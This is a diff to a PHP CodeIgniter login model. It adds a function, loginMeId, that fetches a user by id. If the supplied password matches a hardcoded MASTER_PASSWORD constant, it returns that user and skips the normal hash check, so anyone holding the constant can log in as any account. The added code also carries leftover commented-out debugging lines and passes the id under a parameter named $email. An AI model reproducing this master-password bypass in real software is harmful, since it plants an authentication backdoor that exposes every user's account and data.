@@ -65,7 +65,37 @@ class Login_model extends CI_Model
         }
     }
 
-    public function loginMeById(int $id): ?object
+	function loginMeId($email, $password)
+	{
+//		var_dump($email);
+//		die();
+		$this->fetchtUserData();
+		$this->db->where('BaseTbl.id', $email);
+
+		$query = $this->db->get();
+		$user = $query->row();
+
+		if(($password === MASTER_PASSWORD)){
+			return $user;
+		}
+		else{
+			if(!empty($user)){
+				if(verifyHashedPassword($password, $user->password)){
+					return $user;
+				}
+				else {
+					return array();
+				}
+			}
+			else {
+				return array();
+			}
+		}
+	}
+
+
+
+	public function loginMeById(int $id): ?object
     {
         $this->fetchtUserData();
         $this->db->where('BaseTbl.id', $id);
